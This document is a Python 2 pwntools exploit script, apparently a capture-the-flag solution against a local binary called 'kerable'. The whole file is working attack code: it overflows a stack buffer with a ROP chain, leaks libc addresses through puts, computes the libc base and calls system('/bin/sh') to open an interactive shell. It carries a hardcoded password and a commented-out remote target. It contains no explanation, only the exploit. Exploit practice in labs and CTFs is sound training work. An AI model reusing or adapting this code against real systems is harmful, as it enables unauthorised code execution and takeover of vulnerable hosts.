#!/usr/bin/env python2

from pwn import *


puts_plt = 0x00000000004005D0

puts_got = 0x0000000000600FC8
setvbuf_got = 0x0000000000600FF0

pop_rdi_ret = 0x00000000004008a3
ret = 0x00000000004005b9

binsh_offset = 0x18cd57
system_offset = 0x045390
puts_offset = 0x06f690

main_func = 0x400612


def call_func(func, rdi_param, ret_param):
    username = 'ker'
    password = 'sup3r_$eCre7_h34p_p@s$w()rD'
    buffer_length = 128
    payload = [
        username + '\x00'*5,
        p64(ret) * (buffer_length/8 - 5),
        p64(pop_rdi_ret),
        p64(rdi_param),
        p64(func),
        p64(ret_param)
    ]
    io.sendlineafter(':\n', ''.join(payload))
    io.sendlineafter(':\n', password)
    io.recvuntil('Good bye!\n')


def leak_address(address):
    call_func(puts_plt, address, main_func)
    return u64(io.recv(6) + '\x00\x00')


def main(io):
    setvbuf_libc = leak_address(setvbuf_got)
    print('setvbuf_libc @ 0x%x' % setvbuf_libc)
    puts_libc = leak_address(puts_got)
    print('puts_libc @ 0x%x' % puts_libc)
    libc_base = puts_libc - puts_offset
    print('libc_base @ 0x%x' % libc_base)
    binsh_libc = libc_base + binsh_offset
    system_libc = libc_base + system_offset
    call_func(system_libc, binsh_libc, ret)
    io.interactive()


if __name__ == '__main__':
    io = process('./kerable')
    # io = remote('0.0.0.0', 33063)
    try:
        main(io)
    finally:
        io.close()
